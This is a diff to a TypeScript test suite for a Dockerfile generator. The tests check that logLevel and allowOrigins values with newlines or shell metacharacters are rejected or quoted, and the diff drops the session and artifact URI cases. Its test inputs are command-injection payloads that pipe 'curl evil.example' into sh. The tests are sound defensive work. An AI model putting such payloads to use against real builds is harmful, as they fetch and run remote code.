@@ -115,23 +115,15 @@ describe('createDockerFileContent', () => {
     expect(content).toContain('--otel_to_cloud');
   });
 
-  it('should reject logLevel/allowOrigins/sessionServiceUri/artifactServiceUri containing a newline', () => {
+  it('should reject logLevel/allowOrigins containing a newline', () => {
     // These reach the shell-interpreted CMD line via adkServerOptions, so a
-    // newline in any of them breaks out of that Dockerfile instruction the
+    // newline in either of them breaks out of that Dockerfile instruction the
     // same way appName/project/region do.
     for (const [label, value] of [
       ['logLevel', {logLevel: 'info\nRUN sh -c "curl evil.example|sh"\n#'}],
       [
         'allowOrigins',
         {allowOrigins: 'http://a\nRUN sh -c "curl evil.example|sh"\n#'},
-      ],
-      [
-        'sessionServiceUri',
-        {sessionServiceUri: 'memory://\nRUN sh -c "curl evil.example|sh"\n#'},
-      ],
-      [
-        'artifactServiceUri',
-        {artifactServiceUri: 'gs://b\nRUN sh -c "curl evil.example|sh"\n#'},
       ],
     ] as const) {
       expect(() =>
@@ -140,21 +132,17 @@ describe('createDockerFileContent', () => {
     }
   });
 
-  it('should shell-quote logLevel/allowOrigins/sessionServiceUri/artifactServiceUri in the CMD line', () => {
+  it('should shell-quote logLevel/allowOrigins in the CMD line', () => {
     // These values reach /bin/sh at container start via the CMD line's
     // shell form, so shell metacharacters must be neutralized by quoting.
     const content = createDockerFileContent({
       ...defaultOptions,
       logLevel: 'info; curl evil.example | sh #',
-      sessionServiceUri: 'memory://; curl evil.example | sh #',
-      artifactServiceUri: 'gs://bucket; curl evil.example | sh #',
+      allowOrigins: 'http://a; curl evil.example | sh #',
     });
     expect(content).toContain("--log_level='info; curl evil.example | sh #'");
     expect(content).toContain(
-      "--session_service_uri='memory://; curl evil.example | sh #'",
-    );
-    expect(content).toContain(
-      "--artifact_service_uri='gs://bucket; curl evil.example | sh #'",
+      "--allow_origins='http://a; curl evil.example | sh #'",
     );
   });
 
